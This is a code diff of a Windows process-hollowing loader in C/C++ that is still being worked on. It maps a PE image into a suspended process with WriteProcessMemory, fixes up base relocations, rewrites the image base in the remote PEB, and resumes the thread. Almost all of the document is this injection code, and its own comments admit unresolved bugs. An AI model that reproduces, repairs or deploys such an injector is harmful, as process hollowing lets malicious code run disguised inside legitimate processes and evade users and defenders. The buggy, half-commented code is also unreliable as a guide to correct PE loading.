@@ -161,8 +161,11 @@ void mapRoutineX(HANDLE proc,BYTE* remoteV,MappingMetadata mm,IMAGE_SECTION_HEAD
 
     for(int i=0; i<mm.ImageSectionsCount; i++){
     char* name=(char*)(sec->Name);
+    
     if(strcmp(name,".reloc")==0){
+        printf(".reloc ---- %i|||| base: %llu\n",sec->SizeOfRawData,(unsigned long long)sec);
         *reloc=sec;
+        sec++;
         continue;
     }
 
@@ -195,48 +198,35 @@ void mapRoutineX(HANDLE proc,BYTE* remoteV,MappingMetadata mm,IMAGE_SECTION_HEAD
 
 // BUG IS WITHIN rellocate() SOMEWHERE
 
-int dumpRelocBlockCount(unsigned int sectionSize,void* section){
-    int count=0;
-    unsigned int parsedBytes=0;
-    while(parsedBytes<=sectionSize){
-        IMAGE_BASE_RELOCATION* sec=(IMAGE_BASE_RELOCATION*)section;
-        unsigned int blockSz=(unsigned int)(sec->SizeOfBlock);
-        parsedBytes+=blockSz;
-        count++;
-    }
 
-    return count;
-}
 
+// bug: blockSz shows 0 for some IMAGE_BASE_RELOCATION
 void rellocate(HANDLE proc,void* remoteImageBase,void* heapBase,void* preferedBase,IMAGE_SECTION_HEADER *sec){
     printf("RELLOC STARTED\n");
     // reloction block in heap (first el in list)
-    BYTE* block=(BYTE*)(heapBase+(unsigned int)(sec->PointerToRawData));
+    BYTE* _block=(BYTE*)((BYTE*)heapBase+(unsigned int)(sec->PointerToRawData));
     
     unsigned int secSz=sec->SizeOfRawData;
-
+    printf(".reloc ---- %i\n",secSz);
+    
     long long delta=(unsigned long long)remoteImageBase-(unsigned long long)preferedBase;
+    
+    unsigned int parsedBytes=0;
+    while(parsedBytes<=secSz){
+        IMAGE_BASE_RELOCATION* block=(IMAGE_BASE_RELOCATION*)_block;
 
-    
-    // must correct loop
-    // write payload.cpp 
-    // 
-    // wrong way to loop. i am looping over bytes not size of list of reloc blocks.
-    
-    int blockCount=dumpRelocBlockCount(secSz,block);
-    printf("reloction block count: %i\n",blockCount);
-    
-    for(int i=0;i<blockCount;i++){
-        IMAGE_BASE_RELOCATION* block=(IMAGE_BASE_RELOCATION*)block;
         unsigned int blockSz=block->SizeOfBlock;
+        if(blockSz==0)
+            break;
         unsigned int pageRva=block->VirtualAddress;
         
+        printf("block size: %i\n",blockSz);
         // this block works on given page
         uintptr_t page=(uintptr_t)((unsigned long long)remoteImageBase+pageRva);
-        
         printf("relocation process for page: %llu\n",page);
         
-        unsigned int entriesCount=(blockSz-sizeof(unsigned int)*2)/2;
+        unsigned int entriesCount=(blockSz-8)/2;
+        printf("entreis count: %i\n",entriesCount);
 
         WORD* entry=(WORD*)((BYTE*)block+8);
 
@@ -244,10 +234,12 @@ void rellocate(HANDLE proc,void* remoteImageBase,void* heapBase,void* preferedBa
             
             BYTE relocType=*entry>>12;
             WORD offset=*entry & 0x0FFF;
+            
             if(relocType==3 || relocType==10){
                 uintptr_t absolute=page+offset;
                 uintptr_t relocated=(uintptr_t)((absolute-(uintptr_t)preferedBase)+delta);
                 printf("before relocation: %llu ---- after relocation: %llu\n",absolute,relocated);
+
                 if(!WriteProcessMemory(
                     proc,
                     (void*)absolute,
@@ -259,13 +251,15 @@ void rellocate(HANDLE proc,void* remoteImageBase,void* heapBase,void* preferedBa
                     exit(1);
                 }
             }
-            entry+=2;
+            entry++;
         }
-
-        block+=blockSz;
+        parsedBytes+=blockSz;
+        _block+=blockSz;
     }
     printf("relocated successfuly!\n");
 }
+
+
 
 bool hallowAndStart(HANDLE proc,HANDLE thread,BYTE* pe){
 HANDLE self=GetCurrentProcess();
@@ -329,22 +323,37 @@ if(!KERNEL_STYLE)
     mapRoutineX(proc,remoteV,mm,&reloc); // ELSE mapRoutineY();
 
 if(mm.preferedBase!=(unsigned long long)remoteV){
-
     rellocate(proc,(void*)remoteV,(void*)mm.heapBase,(void*)mm.preferedBase,reloc);
 }
 
-uintptr_t entryPont=(uintptr_t)(remoteV+mm.RVAAddressOfEntryPoint);
-printf("ENTRY POINT: %llu\n",entryPont);
-CONTEXT thContext;
-if(!GetThreadContext(thread,&thContext))
-    printf("[-] 288!\n");
-    
-thContext.Rip=(DWORD64)entryPont;
-if(!SetThreadContext(thread,&thContext))
-    printf("[-] 293!\n");
+// adjusting image base in remote PEB
 
-if(ResumeThread(thread)!=-1)
+if(!WriteProcessMemory(
+    proc,
+    baseAddrAddr,
+    &remoteV,
+    sizeof(unsigned long long),
+    NULL
+)){
+    printf("PEB CANT BE ADJUSTED!\n");
+    exit(1);
+}
+
+
+// uintptr_t entryPont=(uintptr_t)(remoteV+mm.RVAAddressOfEntryPoint);
+// printf("ENTRY POINT: %llu\n",entryPont);
+// CONTEXT thContext;
+// if(!GetThreadContext(thread,&thContext))
+//     printf("[-] 288!\n");
+    
+// thContext.Rip=(DWORD64)entryPont;
+// if(!SetThreadContext(thread,&thContext))
+//     printf("[-] 293!\n");
+
+if(ResumeThread(thread)!=-1){
+    printf("main thread started!\n");
     return true;
+}
 return false;
 }
 
@@ -363,5 +372,8 @@ extern bool initializeTetrix(){
 }
 
 
-
+int main(){
+    initializeTetrix();
+    return 0;
+}
 
